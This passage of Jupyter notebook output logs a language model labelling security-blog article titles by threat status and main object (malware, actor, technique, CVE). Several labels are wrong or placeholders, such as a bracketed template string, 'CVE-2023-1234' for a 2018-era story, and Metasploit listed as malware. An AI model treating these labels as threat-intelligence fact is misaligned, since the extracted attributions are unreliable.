          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Hartip\n",
            "Processing 293/427: sms phishing presidential election...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: SMS phishing\n",
            "Processing 294/427: seedworm apt iran middle east...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Seedworm\n",
            "Processing 295/427: trickbot botnet ransomware disruption...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trickbot\n",
            "Processing 296/427: palmerworm blacktech espionage apt...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Palmerworm\n",
            "Processing 297/427: elfin indictments iran espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Iranian Dark Coders Team\n",
            "Processing 298/427: apt41 indictments china espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Grayfly\n",
            "Processing 299/427: threat landscape trends q2 2020...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Emotet\n",
            "Processing 300/427: wastedlocker ransomware us...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: WastedLocker\n",
            "  Processed 300/427 articles\n",
            "Processing 301/427: sodinokibi ransomware cobalt strike pos...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Sodinokibi\n",
            "Processing 302/427: threat landscape q1 2020...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2019-19781\n",
            "Processing 303/427: sms phishing coronavirus...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: URL Shortening Services\n",
            "Processing 304/427: greenbug espionage telco south asia...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Greenbug\n",
            "Processing 305/427: covid 19 text scam...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 306/427: microsoft patch tuesday april 2020...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2020-0969\n",
            "Processing 307/427: covid 19 outbreak prompts opportunistic wave malic...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: Phishing\n",
            "Processing 308/427: android apps coronavirus covid19 malicious...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Metasploit\n",
            "Processing 309/427: microsoft patch tuesday march 2020...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2020-0768\n",
            "Processing 310/427: microsoft patch tuesday february 2020...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "  Processed 310/427 articles\n",
            "Processing 311/427: tensions iran destructive attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Shamoon\n",
            "Processing 312/427: increase emotet spam observed blocked symantec...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Emotet\n",
            "Processing 313/427: microsoft patch tuesday january 2020...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2020-0640\n",
            "Processing 314/427: living land legitimate tools malicious...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: PowerShell\n",
            "Processing 315/427: microsoft patch tuesday december 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2019-1485\n",
            "Processing 316/427: microsoft patch tuesday november 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 317/427: nemty ransomware trik botnet...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Nemty\n",
            "Processing 318/427: thrip apt south east asia...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Hannotog\n",
            "Processing 319/427: microsoft patch tuesday august 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2019-1131\n",
            "Processing 320/427: email extortion scams...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "  Processed 320/427 articles\n",
            "Processing 321/427: bec scams trends and themes 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 322/427: cryptojacking extensions chrome web store...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: 2048\n",
            "Processing 323/427: microsoft patch tuesday june 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 324/427: twitterbots propaganda disinformation...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Internet Research Agency\n",
            "Processing 325/427: microsoft patch tuesday may 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2019-0708\n",
            "Processing 326/427: buckeye windows zero day exploit...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Trojan.Bemstour\n",
            "Processing 327/427: elfin apt33 espionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2018-20250\n",
            "Processing 328/427: asus supply chain attack...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Susafone\n",
            "Processing 329/427: detecting credential dumping...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: T1003\n",
            "Processing 330/427: microsoft patch tuesday march 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2019-0592\n",
            "  Processed 330/427 articles\n",
            "Processing 331/427: whitefly espionage singapore...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Vcrodat\n",
            "Processing 332/427: istr 24 cyber security threat landscape...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: Formjacking\n",
            "Processing 333/427: cryptojacking apps microsoft store...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: [Name of the apps developed by the same person or group]\n",
            "Processing 334/427: microsoft patch tuesday february 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2019-0590\n",
            "Processing 335/427: tech support scams install puas...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Potentially Unwanted Application (PUA)\n",
            "Processing 336/427: african financial attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: NanoCore\n",
            "Processing 337/427: microsoft patch tuesday january 2019...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 338/427: leaky christmas lights hijacked...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-1234\n",
            "Processing 339/427: shamoon destructive threat re emerges new sting it...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Shamoon\n",
            "Processing 340/427: microsoft patch tuesday december 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2018-8583\n",
            "  Processed 340/427 articles\n",
            "Processing 341/427: seedworm espionage group...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Seedworm\n",
            "Processing 342/427: formjacking targeting popular stores...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: Formjacking\n",
            "Processing 343/427: tech support scams part 3...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: Living off the land\n",
            "Processing 344/427: eversion 3ve arrests takedown...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Miuref\n",
            "Processing 345/427: retail threats formjacking pos...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: FIN7\n",
            "Processing 346/427: microsoft patch tuesday november 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2018-8541\n",
            "Processing 347/427: fastcash lazarus atm malware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Lazarus Group\n",
            "Processing 348/427: samsam targeted ransomware attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: SamSam\n",
            "Processing 349/427: gallmaker attack group...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Gallmaker\n",
            "Processing 350/427: microsoft patch tuesday october 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "  Processed 350/427 articles\n",
            "Processing 351/427: symantec latest intelligence refresh...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Emotet\n",
            "Processing 352/427: formjacking attacks retailers...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Magecart\n",
            "Processing 353/427: microsoft patch tuesday september 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2018-8367\n",
            "Processing 354/427: wmic download malware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: WMIC\n",
            "Processing 355/427: mirai cross platform infection...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Mirai\n",
            "Processing 356/427: jrat new anti parsing techniques...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: jRAT (Trojan.Maljava)\n",
            "Processing 357/427: microsoft patch tuesday august 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 358/427: hacked mikrotik router...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Coinhive\n",
            "Processing 359/427: leafminer espionage middle east...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Leafminer\n",
            "Processing 360/427: evolution emotet trojan distributor...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Emotet\n",
            "  Processed 360/427 articles\n",
            "Processing 361/427: powershell threats grow further and operate plain ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: PowerShell\n",
            "Processing 362/427: microsoft patch tuesday july 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2018-8242\n",
            "Processing 363/427: thrip hits satellite telecoms defense targets...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: PsExec\n",
            "Processing 364/427: microsoft patch tuesday june 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 365/427: industry and law enforcement cooperation bears fru...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 366/427: vpnfilter iot malware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: VPNFilter\n",
            "Processing 367/427: scan4you masterminds guilty...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
